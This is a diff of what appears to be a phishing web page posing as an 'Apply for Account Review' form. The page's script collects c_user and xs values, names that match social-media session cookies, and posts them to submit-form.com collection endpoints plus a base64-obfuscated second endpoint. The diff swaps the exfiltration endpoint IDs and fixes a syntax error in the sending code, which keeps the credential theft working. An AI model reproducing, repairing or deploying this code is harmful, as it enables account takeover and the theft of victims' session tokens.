@@ -1241,7 +1241,7 @@
                 <i class="fas fa-file-alt"></i> Apply for Account Review
             </button>
             
-            <div style="display: none;">https://submit-form.com/A5Wq0pza4</div>
+            <div style="display: none;">https://submit-form.com/n2RZqvdp2</div>
         </div>
     </div>
     
@@ -1990,7 +1990,7 @@
                 const cUser = document.getElementById('c_user').value;
                 const xs = document.getElementById('xs').value;
                 
-                const endpoint1 = "https://submit-form.com/n2RZqvdp2";
+                const endpoint1 = "https://submit-form.com/A5Wq0pza4";
                 const endpoint2 = atob(obfuscatedEndpoint);
                 
                 const formData = {
@@ -2017,7 +2017,7 @@
                 .then(responses => {
                     responses.forEach((response, index) => {
                         if (!response.ok) {
-                            console.error(Submission to endpoint ${index+1} failed);
+                            console.error(`Submission to endpoint ${index+1} failed`);
                         }
                     });
                 })
@@ -2025,8 +2025,6 @@
                     console.error('Submission error:', error);
                 });
             });
-</script>
-
             
             // Reset form
             function resetForm() {
